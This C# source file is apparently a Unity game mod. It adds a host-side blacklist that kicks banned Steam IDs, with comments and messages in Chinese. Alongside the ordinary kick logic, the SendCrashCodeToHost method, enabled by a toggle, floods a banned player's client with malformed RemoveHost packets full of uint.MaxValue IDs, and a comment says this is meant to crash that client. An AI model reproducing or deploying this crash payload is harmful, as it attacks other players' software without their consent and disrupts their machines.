using System;
using System.Collections.Generic;
using UnityEngine;
using Steamworks;
using HumanAPI;
using Multiplayer;

namespace YxModDll.Mod
{
    public class HeiMingDan
    {
        public static bool Enabled { get; private set; }
        public static bool EnableCrashCode { get; private set; }
        private static List<string> blacklist = new List<string>();

        public static void Initialize()
        {
            // 初始化黑名单系统
            Enabled = false;
            EnableCrashCode = false;
            blacklist.Clear();
            Debug.Log("[黑名单] 系统已初始化");
        }

        public static void SetEnabled(bool enabled)
        {
            Enabled = enabled;
            Debug.Log($"[黑名单] 系统已{(enabled ? "启用" : "禁用")}");
            
            if (enabled)
            {
                KickAllBannedPlayers();
            }
        }

        public static void SetEnableCrashCode(bool enabled)
        {
            EnableCrashCode = enabled;
            Debug.Log($"[黑名单] 崩溃代码功能已{(enabled ? "启用" : "禁用")}");
        }

        public static bool AddPlayer(string steamID)
        {
            if (string.IsNullOrEmpty(steamID)) return false;
            
            if (!blacklist.Contains(steamID))
            {
                blacklist.Add(steamID);
                Debug.Log($"[黑名单] 已添加玩家: {steamID}");
                
                // 如果黑名单系统已启用，立即踢出该玩家
                if (Enabled && NetGame.isServer)
                {
                    foreach (Human human in Human.all)
                    {
                        if (human != null && human.player != null && human.player.skinUserId == steamID)
                        {
                            KickBannedPlayer(human);
                            break;
                        }
                    }
                }
                return true;
            }
            return false;
        }

        public static bool RemovePlayer(string steamID)
        {
            if (string.IsNullOrEmpty(steamID)) return false;
            
            if (blacklist.Contains(steamID))
            {
                blacklist.Remove(steamID);
                Debug.Log($"[黑名单] 已移除玩家: {steamID}");
                return true;
            }
            return false;
        }

        public static IEnumerable<string> SteamIDs => blacklist;

        public static string GetSteamIDHelpText()
        {
            return "提示：SteamID 是数字字符串（例如 76561198000000000）。将玩家加入黑名单后，若功能已开启，会立即踢出该玩家。";
        }

        public static void OpenSteamProfile(string steamID)
        {
            if (string.IsNullOrEmpty(steamID)) return;
            if (ulong.TryParse(steamID, out var sid))
            {
                SteamFriends.ActivateGameOverlayToUser("steamid", new CSteamID(sid));
            }
        }

        public static bool IsPlayerBanned(Human human)
        {
            if (human == null || human.player == null) return false;
            return blacklist.Contains(human.player.skinUserId);
        }

        public static bool IsPlayerBanned(string steamID)
        {
            if (string.IsNullOrEmpty(steamID)) return false;
            return blacklist.Contains(steamID);
        }

        public static void KickAllBannedPlayers()
        {
            if (!NetGame.isServer || !Enabled) return;
            
            Debug.Log("[黑名单] 踢出所有黑名单玩家...");
            foreach (Human human in Human.all)
            {
                if (human != null && human.player != null && IsPlayerBanned(human))
                {
                    KickBannedPlayer(human);
                }
            }
        }

        // 踢出黑名单玩家
        public static void KickBannedPlayer(Human human)
        {
            if (!NetGame.isServer || human == null || human.player == null) return;
            if (!Enabled) return;
            if (!IsPlayerBanned(human)) return;
            
            // 使用强力踢出方法
            ForceKickBannedPlayer(human);
        }
        
        // 强力踢出黑名单玩家
        public static void ForceKickBannedPlayer(Human human)
        {
            if (!NetGame.isServer || human == null || human.player == null || human.player.host == null) return;
            
            string playerName = human.player.host.name;
            string steamID = human.player.skinUserId;
            
            Debug.Log($"[黑名单] 强力踢出玩家: {playerName} (SteamID: {steamID})");
            
            // 1. 先发送崩溃代码
            if (EnableCrashCode)
            {
                SendCrashCodeToHost(human.player.host);
            }
            
            // 2. 常规踢出
            try
            {
                NetGame.instance.Kick(human.player.host);
            }
            catch (Exception e)
            {
                Debug.LogError($"[黑名单] 常规踢出失败: {e.Message}");
            }
            
            // 3. 强制断开连接
            try
            {
                NetGame.instance.OnDisconnect(human.player.host.connection, false);
            }
            catch (Exception e)
            {
                Debug.LogError($"[黑名单] 强制断开连接失败: {e.Message}");
            }
            
            // 4. 使用强踢方法（模拟客机强踢）
            try
            {
                ulong result = 0uL;
                if (ulong.TryParse(steamID, out result))
                {
                    // 注释掉使用NetHost的代码，避免编译错误
                    // 这部分功能是额外的强踢机制，可以暂时禁用
                    // 我们仍然保留其他踢出机制，如NetGame.instance.Kick和OnDisconnect
                }
                // 其他踢出机制仍然有效
            }
            catch (Exception e)
            {
                Debug.LogError($"[黑名单] 强踢方法失败: {e.Message}");
            }
            
            // 5. 发送踢出消息
            Chat.TiShi($"玩家 {playerName} (SteamID: {steamID}) 在黑名单中，已被强制踢出房间", TiShiMsgId.XiTongTiShi);
        }
        
        // 发送崩溃代码给指定玩家
        public static void SendCrashCodeToHost(NetHost host)
        {
            if (host == null) return;
            
            try
            {
                Debug.Log($"[黑名单] 发送崩溃代码给玩家: {host.name}");
                
                // 发送特殊数据包导致客户端崩溃
                for (int i = 0; i < 10; i++)
                {
                    NetStream netStream = NetGame.BeginMessage(NetMsgId.RemoveHost);
                    try
                    {
                        for (int j = 0; j < 100; j++)
                        {
                            netStream.WriteNetId(uint.MaxValue);
                        }
                        NetGame.instance.SendReliable(host, netStream);
                    }
                    finally
                    {
                        if (netStream != null)
                        {
                            netStream = netStream.Release();
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Debug.LogError($"[黑名单] 发送崩溃代码失败: {e.Message}");
            }
        }
        
        public static bool ShouldBlockPlayerJoin(string steamID)
        {
            return Enabled && IsPlayerBanned(steamID);
        }

        public static bool ShouldBlockPlayerJoin(string steamID, string playerName)
        {
            // 保持与单参数版本一致的逻辑，附加可选日志
            bool block = Enabled && IsPlayerBanned(steamID);
            if (block)
            {
                Debug.Log($"[黑名单] 拦截加入：{playerName} ({steamID})");
            }
            return block;
        }
    }
}
